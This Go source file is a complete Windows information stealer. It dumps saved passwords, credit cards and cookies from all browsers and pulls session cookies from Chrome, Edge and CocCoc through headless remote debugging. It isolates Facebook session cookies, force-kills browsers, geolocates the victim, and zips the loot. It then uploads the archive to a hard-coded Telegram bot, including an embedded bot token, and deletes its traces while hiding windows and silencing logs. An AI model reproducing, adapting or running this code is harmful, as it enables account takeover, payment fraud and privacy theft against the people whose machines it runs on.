package main

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/storage"
	"github.com/chromedp/chromedp"
	"github.com/moond4rk/hackbrowserdata/browser"
)

type IPLocation struct {
	Region  string `json:"region"`
	Country string `json:"country"`
}

type ProfileStatus struct {
	name     string
	attempts int
	success  bool
}

const (
	TelegramBotToken = "7944937404:AAFGYLrLSBzkB2t0k03KG953KLFsjYhKyQE"
	TelegramChatID   = "-4521555028"
)

const (
	PATH_PUBLIC  = `C:\Users\Public`
	PATH_DEFAULT = `C:\Users\Default`
	PATH_USER    = `C:\Users\%USERNAME%`
)

func getWorkingPath() string {
	if err := os.MkdirAll(PATH_PUBLIC, 0750); err == nil {
		testFile := filepath.Join(PATH_PUBLIC, "test.txt")
		if f, err := os.Create(testFile); err == nil {
			f.Close()
			os.Remove(testFile)
			return PATH_PUBLIC
		}
	}

	if err := os.MkdirAll(PATH_DEFAULT, 0750); err == nil {
		testFile := filepath.Join(PATH_DEFAULT, "test.txt")
		if f, err := os.Create(testFile); err == nil {
			f.Close()
			os.Remove(testFile)
			return PATH_DEFAULT
		}
	}

	username := os.Getenv("USERNAME")
	userPath := strings.Replace(PATH_USER, "%USERNAME%", username, -1)
	if err := os.MkdirAll(userPath, 0750); err == nil {
		testFile := filepath.Join(userPath, "test.txt")
		if f, err := os.Create(testFile); err == nil {
			f.Close()
			os.Remove(testFile)
			return userPath
		}
	}

	return PATH_PUBLIC
}
func createZipFile(sourceDir string) (string, error) {
	log.SetOutput(ioutil.Discard)

	hostname, err := os.Hostname()
	if err != nil {
		return "", err
	}

	currentUser, err := user.Current()
	if err != nil {
		return "", err
	}

	province, country, err := getLocation()
	if err != nil {
		province = "Unknown"
		country = "Unknown"
	}

	filename := fmt.Sprintf("%s_%s_%s_%s_%s.zip",
		hostname,
		currentUser.Username,
		province,
		country,
		time.Now().Format("02-01-2006_15-04-05"),
	)

	zipPath := filepath.Join(os.TempDir(), filename)

	zipDir := filepath.Dir(zipPath)
	if _, err := os.Stat(zipDir); os.IsNotExist(err) {
		if err = os.MkdirAll(zipDir, 0755); err != nil {
			return "", err
		}
	}

	zipFile, err := os.Create(zipPath)
	if err != nil {
		return "", err
	}
	defer zipFile.Close()

	archive := zip.NewWriter(zipFile)
	defer archive.Close()

	err = filepath.Walk(sourceDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(sourceDir, path)
		if err != nil {
			return err
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		header.Name = relPath
		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}

		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()

		_, err = io.Copy(writer, file)
		return err
	})

	if err != nil {
		return "", err
	}

	return zipPath, nil
}

func extractFace(cookieFilePath string, fbFolder string) error {
	log.SetOutput(ioutil.Discard)

	if err := os.MkdirAll(fbFolder, 0750); err != nil {
		return err
	}

	content, err := ioutil.ReadFile(cookieFilePath)
	if err != nil {
		return err
	}

	cookies := strings.Split(string(content), "\n")
	fbCookies := make(map[string]string)

	hasFacebookCookie := false
	for _, cookie := range cookies {
		if strings.Contains(cookie, "facebook.com") {
			hasFacebookCookie = true
			parts := strings.Split(strings.TrimSpace(cookie), "\t")
			if len(parts) >= 7 {
				cookieName := parts[5]
				cookieValue := parts[6]
				fbCookies[cookieName] = cookieValue
			}
		}
	}

	if hasFacebookCookie {
		var cookiePairs []string
		for name, value := range fbCookies {
			cookiePairs = append(cookiePairs, fmt.Sprintf("%s=%s", name, value))
		}
		formattedCookies := strings.Join(cookiePairs, ";")

		fbCookieFilePath := filepath.Join(fbFolder, filepath.Base(cookieFilePath))
		if err := ioutil.WriteFile(fbCookieFilePath, []byte(formattedCookies), 0644); err != nil {
			return err
		}
	}

	return nil
}

func countFiles(sourceDir string) (int, int, int) {
	log.SetOutput(ioutil.Discard)

	cookieCount := 0
	passwordCount := 0
	creditCardCount := 0

	// Đếm file trong thư mục Cookie
	cookieDir := filepath.Join(sourceDir, "Cookie")
	if _, err := os.Stat(cookieDir); err == nil {
		files, err := ioutil.ReadDir(cookieDir)
		if err == nil {
			cookieCount = len(files)
		}
	}

	// Đếm file trong thư mục Password
	passwordDir := filepath.Join(sourceDir, "Password")
	if _, err := os.Stat(passwordDir); err == nil {
		files, err := ioutil.ReadDir(passwordDir)
		if err == nil {
			passwordCount = len(files)
		}
	}

	// Đếm file trong thư mục CreditCard
	creditCardDir := filepath.Join(sourceDir, "CreditCard")
	if _, err := os.Stat(creditCardDir); err == nil {
		files, err := ioutil.ReadDir(creditCardDir)
		if err == nil {
			creditCardCount = len(files)
		}
	}

	return cookieCount, passwordCount, creditCardCount
}
func countFacebookFiles(fbFolder string) int {
	log.SetOutput(ioutil.Discard)

	files, err := ioutil.ReadDir(fbFolder)
	if err != nil {
		return 0
	}
	return len(files)
}

func sendToTelegram(zipFilePath string, cookieCount, passwordCount, creditCardCount, fbFileCount int) error {
	log.SetOutput(ioutil.Discard)

	file, err := os.Open(zipFilePath)
	if err != nil {
		return err
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return err
	}

	hostname, err := os.Hostname()
	if err != nil {
		return err
	}

	osInfo := getOSInfo()
	windowsVersion := getWindowsVersion(osInfo["os"])
	locationRegion, locationCountry, _ := getLocation()
	ipv4Addresses := getIPv4Addresses()
	utcOffset := getUTCOffset()

	caption := fmt.Sprintf("Location: %s, %s\nHostname: %s\nOperating System: %s\nIPv4 Addresses: %s\nTime Log: %s (UTC%+d)\nCookies browser: %d files\nAccount & password: %d files\nCredit Cards: %d files\nFacebook cookies: %d files",
		locationRegion, locationCountry,
		hostname,
		windowsVersion,
		strings.Join(ipv4Addresses, ", "),
		fileInfo.ModTime().Format("01/02/2006, 15:04:05"),
		utcOffset,
		cookieCount,
		passwordCount,
		creditCardCount,
		fbFileCount)

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	_ = writer.WriteField("chat_id", TelegramChatID)
	_ = writer.WriteField("caption", caption)

	part, err := writer.CreateFormFile("document", filepath.Base(zipFilePath))
	if err != nil {
		return err
	}

	if _, err = io.Copy(part, file); err != nil {
		return err
	}

	if err = writer.Close(); err != nil {
		return err
	}

	req, err := http.NewRequest("POST", "https://api.telegram.org/bot"+TelegramBotToken+"/sendDocument", body)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("telegram api error: %s", string(bodyBytes))
	}

	return nil
}

func getIPv4Addresses() []string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return []string{"Unknown"}
	}

	var ipv4Addresses []string
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				ipv4Addresses = append(ipv4Addresses, ipNet.IP.String())
			}
		}
	}
	return ipv4Addresses
}

func getUTCOffset() int {
	_, offset := time.Now().Zone()
	return offset / 3600
}

func getOSInfo() map[string]string {
	return map[string]string{
		"os":         runtime.GOOS,
		"arch":       runtime.GOARCH,
		"cpus":       fmt.Sprintf("%d", runtime.NumCPU()),
		"go_version": runtime.Version(),
	}
}

func getWindowsVersion(osName string) string {
	if osName != "windows" {
		return osName
	}

	cmd := exec.Command("wmic", "os", "get", "Caption")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.Output()
	if err != nil {
		return "Unknown"
	}

	lines := strings.Split(string(out), "\n")
	if len(lines) < 2 {
		return "Unknown"
	}

	return strings.TrimSpace(lines[1])
}

func getLocation() (string, string, error) {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("http://ip-api.com/json/")
	if err != nil {
		return "Unknown", "Unknown", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "Unknown", "Unknown", err
	}

	var location IPLocation
	if err := json.Unmarshal(body, &location); err != nil {
		return "Unknown", "Unknown", err
	}

	if location.Region == "" {
		location.Region = "Unknown"
	}
	if location.Country == "" {
		location.Country = "Unknown"
	}

	return location.Region, location.Country, nil
}

func Browserdata() error {
	log.SetOutput(ioutil.Discard)

	browsers, err := browser.PickBrowsers("all", "")
	if err != nil {
		return err
	}

	for _, b := range browsers {
		if data, err := b.BrowsingData(true); err == nil {
			data.Output("results", b.Name(), "txt")
		}
	}

	return nil
}

func Runcook(browserType string) error {
	log.SetOutput(ioutil.Discard)

	hostname, err := os.Hostname()
	if err != nil {
		return err
	}

	cookieDir := filepath.Join(getWorkingPath(), hostname, "Cookie")
	if err := os.MkdirAll(cookieDir, 0750); err != nil {
		return err
	}

	processBrowser(browserType)

	return nil
}

func processBrowser(browserType string) {
	log.SetOutput(ioutil.Discard)

	var userDataDir string
	var execPaths []string

	username := os.Getenv("USERNAME")
	programFiles := os.Getenv("PROGRAMFILES")
	programFiles86 := os.Getenv("PROGRAMFILES(X86)")
	localAppData := os.Getenv("LOCALAPPDATA")

	switch browserType {
	case "chrome":
		userDataDir = filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
		execPaths = []string{
			`C:\Program Files\Google\Chrome\Application\chrome.exe`,
			`C:\Program Files (x86)\Google\Chrome\Application\chrome.exe`,
			filepath.Join(localAppData, "Google", "Chrome", "Application", "chrome.exe"),
			`C:\Users\` + username + `\AppData\Local\Google\Chrome\Application\chrome.exe`,
			filepath.Join(programFiles, "Google", "Chrome", "Application", "chrome.exe"),
			filepath.Join(programFiles86, "Google", "Chrome", "Application", "chrome.exe"),
			`C:\Program Files\Google\Chrome Beta\Application\chrome.exe`,
			`C:\Program Files\Google\Chrome Dev\Application\chrome.exe`,
			`C:\Program Files\Google\Chrome Canary\Application\chrome.exe`,
			filepath.Join(localAppData, "Google", "Chrome Beta", "Application", "chrome.exe"),
			filepath.Join(localAppData, "Google", "Chrome Dev", "Application", "chrome.exe"),
			filepath.Join(localAppData, "Google", "Chrome SxS", "Application", "chrome.exe"),
			`D:\Program Files\Google\Chrome\Application\chrome.exe`,
			`D:\Program Files (x86)\Google\Chrome\Application\chrome.exe`,
			`E:\Program Files\Google\Chrome\Application\chrome.exe`,
			`E:\Program Files (x86)\Google\Chrome\Application\chrome.exe`,
		}
	case "edge":
		userDataDir = filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
		execPaths = []string{
			`C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`,
			`C:\Program Files\Microsoft\Edge\Application\msedge.exe`,
			filepath.Join(programFiles, "Microsoft", "Edge", "Application", "msedge.exe"),
			filepath.Join(programFiles86, "Microsoft", "Edge", "Application", "msedge.exe"),
			filepath.Join(localAppData, "Microsoft", "Edge", "Application", "msedge.exe"),
			`C:\Users\` + username + `\AppData\Local\Microsoft\Edge\Application\msedge.exe`,
			filepath.Join(programFiles, "Microsoft", "Edge Beta", "Application", "msedge.exe"),
			filepath.Join(programFiles, "Microsoft", "Edge Dev", "Application", "msedge.exe"),
			filepath.Join(programFiles, "Microsoft", "Edge Canary", "Application", "msedge.exe"),
			filepath.Join(localAppData, "Microsoft", "Edge Beta", "Application", "msedge.exe"),
			filepath.Join(localAppData, "Microsoft", "Edge Dev", "Application", "msedge.exe"),
			filepath.Join(localAppData, "Microsoft", "Edge SxS", "Application", "msedge.exe"),
			`D:\Program Files\Microsoft\Edge\Application\msedge.exe`,
			`D:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`,
			`E:\Program Files\Microsoft\Edge\Application\msedge.exe`,
			`E:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`,
		}
	case "coccoc":
		userDataDir = filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data")
		execPaths = []string{
			`C:\Program Files\CocCoc\Browser\Application\browser.exe`,
			`C:\Program Files (x86)\CocCoc\Browser\Application\browser.exe`,
			filepath.Join(localAppData, "CocCoc", "Browser", "Application", "browser.exe"),
			`C:\Users\` + username + `\AppData\Local\CocCoc\Browser\Application\browser.exe`,
			filepath.Join(programFiles, "CocCoc", "Browser", "Application", "browser.exe"),
			filepath.Join(programFiles86, "CocCoc", "Browser", "Application", "browser.exe"),
			`D:\Program Files\CocCoc\Browser\Application\browser.exe`,
			`D:\Program Files (x86)\CocCoc\Browser\Application\browser.exe`,
			`E:\Program Files\CocCoc\Browser\Application\browser.exe`,
			`E:\Program Files (x86)\CocCoc\Browser\Application\browser.exe`,
		}
	}
	var execPath string
	for _, path := range execPaths {
		if _, err := os.Stat(path); err == nil {
			execPath = path
			break
		}
	}

	if execPath == "" {
		execPath = searchBrowser(browserType)
	}

	if execPath == "" {
		return
	}

	profiles := findProfiles(userDataDir)
	if len(profiles) == 0 {
		return
	}

	var profileStatuses []ProfileStatus
	for _, profile := range profiles {
		profileStatuses = append(profileStatuses, ProfileStatus{
			name:     profile,
			attempts: 0,
			success:  false,
		})
	}

	maxRetries := 3
	for retry := 0; retry < maxRetries; retry++ {
		var failedProfiles []ProfileStatus

		for i := range profileStatuses {
			if profileStatuses[i].success {
				continue
			}

			if profileStatuses[i].attempts >= maxRetries {
				continue
			}

			success := processProfileWithCheck(browserType, execPath, userDataDir, profileStatuses[i].name, i)
			profileStatuses[i].attempts++

			if !success {
				failedProfiles = append(failedProfiles, profileStatuses[i])
			} else {
				profileStatuses[i].success = true
			}

			time.Sleep(2 * time.Second)
		}

		if len(failedProfiles) == 0 {
			break
		}

		for _, failed := range failedProfiles {
			log.Printf("Profile %s failed attempt %d/%d\n", failed.name, failed.attempts, maxRetries)
		}

		time.Sleep(2 * time.Second)
	}
}
func processProfileWithCheck(browserType, execPath, userDataDir, profileName string, profileNum int) bool {
	profileType := getProfileNumber(profileName)
	fileName := fmt.Sprintf("cookies_%s_%s.txt", browserType, profileType)

	var debugPort string
	switch browserType {
	case "chrome":
		debugPort = fmt.Sprintf("92%d", 22+profileNum)
	case "edge":
		debugPort = fmt.Sprintf("93%d", 23+profileNum)
	case "coccoc":
		debugPort = fmt.Sprintf("94%d", 24+profileNum)
	}

	killBrowsers()

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	cmd := exec.Command(execPath,
		"--remote-debugging-port="+debugPort,
		"--headless=new",
		"--disable-gpu",
		"--no-sandbox",
		"--disable-dev-shm-usage",
		"--disable-background-networking",
		"--disable-background-timer-throttling",
		"--disable-backgrounding-occluded-windows",
		"--disable-breakpad",
		"--disable-client-side-phishing-detection",
		"--disable-component-update",
		"--disable-default-apps",
		"--disable-hang-monitor",
		"--disable-prompt-on-repost",
		"--disable-sync",
		"--disable-translate",
		"--metrics-recording-only",
		"--no-first-run",
		"--safebrowsing-disable-auto-update",
		"--password-store=basic",
		"--use-mock-keychain",
		"--user-data-dir="+userDataDir,
		"--profile-directory="+profileName,
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := cmd.Start(); err != nil {
		return false
	}

	defer func() {
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
		killBrowsers()
	}()

	time.Sleep(3 * time.Second)

	wsURL := fmt.Sprintf("ws://localhost:%s", debugPort)
	allocCtx, cancel := chromedp.NewRemoteAllocator(ctx, wsURL)
	defer cancel()

	taskCtx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	done := make(chan bool, 1)

	go func() {
		var cookies []*network.Cookie
		err := chromedp.Run(taskCtx,
			chromedp.ActionFunc(func(ctx context.Context) error {
				var err error
				cookies, err = storage.GetCookies().Do(ctx)
				return err
			}),
		)

		if err == nil && len(cookies) > 0 {
			err = saveCookies(cookies, fileName)
			if err == nil {
				done <- true
				return
			}
		}
		done <- false
	}()

	select {
	case success := <-done:
		return success
	case <-ctx.Done():
		return false
	}
}

func searchBrowser(browserName string) string {
	log.SetOutput(ioutil.Discard)

	var files []string
	drives := []string{"C:", "D:", "E:", "F:"}
	for _, drive := range drives {
		err := filepath.Walk(drive+"\\", func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			if !info.IsDir() {
				filename := strings.ToLower(info.Name())
				if (browserName == "chrome" && filename == "chrome.exe") ||
					(browserName == "edge" && filename == "msedge.exe") {
					files = append(files, path)
				}
			}

			skipDirs := []string{"Windows", "Recovery", "$Recycle.Bin", "Program Files", "Program Files (x86)"}
			if info.IsDir() {
				for _, skipDir := range skipDirs {
					if strings.Contains(path, skipDir) {
						return filepath.SkipDir
					}
				}
			}

			return nil
		})
		if err != nil {
			continue
		}
	}

	if len(files) > 0 {
		return files[0]
	}
	return ""
}

func findProfiles(userDataDir string) []string {
	log.SetOutput(ioutil.Discard)
	var profiles []string

	if _, err := os.Stat(filepath.Join(userDataDir, "Default")); err == nil {
		profiles = append(profiles, "Default")
	}

	entries, err := ioutil.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}

	profileMap := make(map[string]bool)
	for _, profile := range profiles {
		profileMap[profile] = true
	}

	patterns := []string{
		"Profile *",
		"Person *",
		"Guest Profile",
		"System Profile",
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		name := entry.Name()

		for _, pattern := range patterns {
			matched, err := filepath.Match(pattern, name)
			if err == nil && matched {
				prefPath := filepath.Join(userDataDir, name, "Preferences")
				if _, err := os.Stat(prefPath); err == nil {
					if !profileMap[name] {
						profiles = append(profiles, name)
						profileMap[name] = true
					}
				}
				break
			}
		}

		prefPath := filepath.Join(userDataDir, name, "Preferences")
		if _, err := os.Stat(prefPath); err == nil {
			if !profileMap[name] {
				indicators := []string{
					"History",
					"Cookies",
					"Bookmarks",
					"Login Data",
				}

				isProfile := false
				for _, indicator := range indicators {
					if _, err := os.Stat(filepath.Join(userDataDir, name, indicator)); err == nil {
						isProfile = true
						break
					}
				}

				if isProfile {
					profiles = append(profiles, name)
					profileMap[name] = true
				}
			}
		}
	}

	return profiles
}

func getProfileNumber(profileName string) string {
	log.SetOutput(ioutil.Discard)

	if profileName == "Default" {
		return "default"
	}
	if strings.HasPrefix(profileName, "Profile ") {
		parts := strings.Split(profileName, " ")
		if len(parts) == 2 {
			return fmt.Sprintf("profile_%s", parts[1])
		}
	}
	if profileName == "Guest Profile" {
		return "guest"
	}
	if profileName == "System Profile" {
		return "system"
	}

	sanitized := strings.Map(func(r rune) rune {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') {
			return r
		}
		return '_'
	}, profileName)

	if len(sanitized) > 0 && (sanitized[0] >= '0' && sanitized[0] <= '9') {
		sanitized = "profile_" + sanitized
	}

	if sanitized == "" || strings.Trim(sanitized, "_") == "" {
		return "unknown_profile"
	}

	return strings.ToLower(sanitized)
}

func saveCookies(cookies []*network.Cookie, fileName string) error {
	log.SetOutput(ioutil.Discard)

	if len(cookies) == 0 {
		return fmt.Errorf("no cookies found")
	}

	hostname, err := os.Hostname()
	if err != nil {
		return err
	}

	cookieDir := filepath.Join(getWorkingPath(), hostname, "Cookie")
	if err := os.MkdirAll(cookieDir, 0750); err != nil {
		return err
	}

	fullPath := filepath.Join(cookieDir, fileName)
	f, err := os.Create(fullPath)
	if err != nil {
		return err
	}
	defer f.Close()

	successCount := 0
	for _, cookie := range cookies {
		if err := writeCookie(f, cookie); err == nil {
			successCount++
		}
	}

	if successCount < len(cookies)/2 {
		return fmt.Errorf("failed to save sufficient cookies")
	}

	return nil
}

func writeCookie(f *os.File, cookie *network.Cookie) error {
	domain := cookie.Domain
	if !strings.HasPrefix(domain, ".") && !strings.HasPrefix(domain, "http") {
		domain = "." + domain
	}

	path := cookie.Path
	if path == "" {
		path = "/"
	}

	secure := "FALSE"
	if cookie.Secure {
		secure = "TRUE"
	}

	expirationTime := int64(cookie.Expires)
	if expirationTime == 0 {
		expirationTime = time.Now().Add(365 * 24 * time.Hour).Unix()
	}

	line := fmt.Sprintf("%s\tTRUE\t%s\t%s\t%d\t%s\t%s\n",
		domain, path, secure, expirationTime, cookie.Name, cookie.Value)

	_, err := f.WriteString(line)
	return err
}

func killBrowsers() {
	browsers := []string{
		"chrome.exe",
		"msedge.exe",
		"browser.exe",
		"firefox.exe",
		"brave.exe",
		"opera.exe",
	}

	for _, browser := range browsers {
		cmd := exec.Command("taskkill", "/F", "/IM", browser)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()

		cmd = exec.Command("taskkill", "/F", "/T", "/IM", browser)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
	}

	for _, browser := range browsers {
		cmd := exec.Command("taskkill", "/F", "/IM", browser)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
	}
}

func removeDirectory(path string) error {
	return os.RemoveAll(path)
}

func main() {
	log.SetOutput(ioutil.Discard)

	killBrowsers()

	Browserdata()

	browsers := []string{"chrome", "edge", "coccoc"}
	for _, browserType := range browsers {
		Runcook(browserType)
	}

	hostname, _ := os.Hostname()
	sourceDir := filepath.Join(getWorkingPath(), hostname)
	fbFolder := filepath.Join(sourceDir, "Facebook")

	filepath.Walk(sourceDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		if !info.IsDir() && strings.Contains(strings.ToLower(info.Name()), "cookie") {
			extractFace(path, fbFolder)
		}
		return nil
	})

	cookieCount, passwordCount, creditCardCount := countFiles(sourceDir)
	fbFileCount := countFacebookFiles(fbFolder)

	zipPath, err := createZipFile(sourceDir)
	if err != nil {
		return
	}

	if err = sendToTelegram(zipPath, cookieCount, passwordCount, creditCardCount, fbFileCount); err != nil {
		os.Remove(zipPath)
		return
	}

	os.Remove(zipPath)
	removeDirectory(sourceDir)
}
